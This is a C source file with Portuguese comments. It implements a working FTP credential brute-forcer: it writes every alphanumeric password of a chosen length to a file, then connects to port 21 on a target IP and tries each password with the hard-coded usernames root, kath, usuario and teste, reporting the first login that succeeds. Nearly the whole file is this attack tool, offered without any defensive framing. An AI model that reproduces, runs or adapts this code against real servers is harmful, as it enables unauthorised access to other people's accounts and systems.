#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <string.h>
#include <math.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/sendfile.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <termios.h>
#include <fcntl.h>
#include <arpa/inet.h>

#define TAM_KEY 62
#define TAM_LOGIN 4

void iterate(char *str, const char *base[], int idx, int len, FILE *output) {
    int i;
    
    if (idx < (len - 1)) {
        for (i = 0; i < TAM_KEY; ++i) {
            str[idx] = *base[i];
            iterate(str, base, idx + 1, len, output);
        }
    }else{
        for (i = 0; i < TAM_KEY; ++i) {
            str[idx] = *base[i];
            fprintf(output, "%s\n", str);
        }
    }

}

void keyGenerator(unsigned int len){
    const char *letters[TAM_KEY] = {"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","X","W","Y","Z","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","x","w","y","z", "0","1","2","3","4","5","6","7","8","9"};
    char concat[8];
    FILE *output;

    output = fopen("chaves.txt","w+");
    if(output == NULL){
        printf("Erro, Nao foi possivel criar o arquivo de saida\n");
        exit(0);
    }

    memset(concat, 0, 8);

    iterate(concat, letters, 0, len, output);
    fclose(output);
}

int match(char *username, char *password, char *ip){
    char buffer[1024];
    char user[100] = "USER ";
    char pass[100] = "PASS ";
    char error = '5';
    int sock = 0;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0){
        perror("");
        exit(1);
    }
    
    memset(&server, '0', sizeof(server));
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(21);

    if(connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0){
        perror("");
        exit(1);
    }

    //Resposta do Connect
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);

    //Enviado nome do usuario
    memset(buffer, '0', 1024);
    strcat(user, username);
    strcat(user, "\n");
    send(sock, user, strlen(user), 0);

    //Resposta nome do usuario
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    
    //Enviado nome do usuario
    memset(buffer, '0', 1024);
    strcat(pass, password);
    strcat(pass, "\n");
    send(sock, pass, strlen(pass), 0);

    //Resposta nome do usuario
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    
    shutdown(sock, 2);
    if(buffer[0] != error){
        return 1;
    }

    return 0;
}

int bruteforce(unsigned int lenKey, char *ip, char *username, char *password){
    char *login[TAM_LOGIN] = {"root", "kath", "usuario", "teste"};
    char pass[256];
    int i = 0, result = 0, achou = 0;
    FILE *file;
    
    keyGenerator(lenKey);
    
    file = fopen("chaves.txt","r");
    if(file == NULL){
        printf("Erro, Nao foi possivel criar o arquivo de saida\n");
        exit(0);
    }
    
    for(i = 0; i < TAM_LOGIN && !achou; i++){
        while(!feof(file) && !achou){
            fscanf(file, " %s", pass);
            result = match(login[i], pass, ip);
            if(result){
                strcpy(username, login[i]);
                strcpy(password, pass);
                achou = 1;
            }
        }
        rewind(file);
    }

    if(achou == 0){
        printf("Nao foi encontrado uma combinacao de usuario e senha.\n");
        return(EXIT_FAILURE);
    }
    
    return EXIT_SUCCESS;
}
